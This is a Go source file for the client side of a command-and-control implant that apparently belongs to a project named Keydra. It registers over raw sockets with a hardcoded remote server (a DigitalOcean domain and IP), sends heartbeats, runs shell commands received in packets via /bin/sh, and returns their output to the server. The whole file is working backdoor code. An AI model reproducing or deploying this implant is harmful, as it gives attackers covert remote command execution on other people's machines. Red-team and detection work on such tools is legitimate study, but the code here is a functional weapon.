package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/DaveTheBearMan/Keydra/socket"
	"golang.org/x/sys/unix"
)

// Dynamic globals
var lastCmdRan string

// Global statics
var DestinationPort = 5542

// Send command
func sendMessageToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr, clientMessage string) {
    fd := socket.NewSocket()
	defer unix.Close(fd)

    addr := socket.CreateAddrStruct(iface)

	packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, clientMessage)
	socket.SendPacket(fd, iface, addr, packet)
}

// Continuously send HELLO messages so that the C2 can respond with commands
func connectToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	// Register
	sendMessageToServer(iface, src, dst, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
	// packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, socket.GenerateClientMessage(iface.HardwareAddr, src, "JOIN"))
	// socket.SendPacket(fd, iface, addr, packet)
	fmt.Println("[+] Sent Join")

	// Send heartbeat every ten seconds
    go func() {
		time.Sleep(1 * time.Second)
		for {
			sendMessageToServer(iface, src, dst, dstMAC, socket.GenerateClientHeartbeat(iface.HardwareAddr, src))

			fmt.Println("[+] Sent Heartbeat")
			time.Sleep(10 * time.Second)
		}
	}()
}

func clientProcessPacket(packet gopacket.Packet, target bool, hostIP net.IP) (response string) {
	// fmt.Println("[+] Payload Received")
	// Get command payload and trime newline
	data := string(packet.ApplicationLayer().Payload())
	data = strings.Trim(data, "\n")

	// Split into list to get command and args
	payload := strings.Split(data, " ")
	// fmt.Println("[+] PAYLOAD:", payload)

	// Check if target command
	if target {
		if payload[1] == hostIP.String() {
			// fmt.Println("[+] TARGET COMMAND RECEIVED")
			command := strings.Join(payload[2:], " ")
			return execCommand(command)
		}
	} else {
		// Split the string to get the important parts
		// splitcommands := payload[1:]
		// Rejoin string to put into a single bash command string
		command := strings.Join(payload[1:], " ")
		return execCommand(command)
	}
	return ""
}

func execCommand(command string) (response string) {
	// Only run command if we didn't just run it
	if lastCmdRan != command {
		// fmt.Println("[+] COMMAND:", command)

		// Run the command and get output
		output, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
		if err != nil {
			fmt.Println("\n[-] ERROR:", err)
			return fmt.Sprintf("\nERROR:", err)
		}
		// Save last command we just ran
		lastCmdRan = command
		// fmt.Println("[+] OUTPUT:", string(out))
		return string(output)
	} else {
		// fmt.Println("[!] Already ran command", command)
		return ""
	}

}

func main() {
	// Create BPF filter vm
	vm := socket.CreateBPFVM(socket.FilterRaw)

	// Create reading socket
	readfd := socket.NewSocket()
	defer unix.Close(readfd)

	// Get information that is needed for networking
	controlAddr := socket.GetIpv4FromDns("digitalocean.keydra.dev")

	iface, src := socket.GetOutwardIface(fmt.Sprintf("%s:80", controlAddr))
	dstMAC, err := socket.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}

	// Create response socket
	dst := net.IPv4(157, 245, 141, 117)
	connectToServer(iface, src, dst, dstMAC)

	// Listen for commands
	for {
		packet, target := socket.ClientReadPacket(readfd, vm)
		if packet != nil {
			output := clientProcessPacket(packet, target, src)
			sendMessageToServer(iface, src, dst, dstMAC, output)
		}
	}
}